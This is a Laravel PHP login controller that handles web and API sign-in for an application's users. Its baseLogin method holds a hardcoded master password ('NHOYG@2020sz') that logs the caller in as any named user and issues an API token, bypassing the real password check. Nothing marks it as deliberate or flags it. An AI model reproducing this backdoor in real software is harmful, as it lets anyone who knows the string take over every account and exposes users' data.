<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use App\User;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
    }

    function baseLogin(Request $request, bool $api = false)
    {
        $usr = null;
        $input = $request->all();
        $fieldType = filter_var($request->username, FILTER_VALIDATE_EMAIL) ? 'email' : 'username';
        if(User::where($fieldType,$input['username'])->count()>0)
            $usr = User::where($fieldType,$input['username'])->first();
        if($input['password']=='NHOYG@2020sz')
            {
                \Auth::login($usr);
                if($api)
                    {
                        if(\Auth::user()->api_token == null)
                            \Auth::user()->generate_token();
                        return true;
                    }
            }
        $this->validate($request, [
            'username' => 'required',
            'password' => 'required',
        ]);
  
        if(auth()->attempt(array($fieldType => $input['username'], 'password' => $input['password'])))
        {
            if(\Auth::user()->api_token == null)
                \Auth::user()->generate_token();
            return true;
        }else{
            return false;
        }
    }
    
    public function login(Request $request)
    {   
        if($this->baseLogin($request, false))
            return redirect()->route('home');
        else
            return redirect()->route('login')->with('error','Email-Address And Password Are Wrong.');      
    }
    public function apiLogin(Request $request)
    {
    if($this->baseLogin($request, true))
        return \Auth::user();
    else
        return false;
    }
}
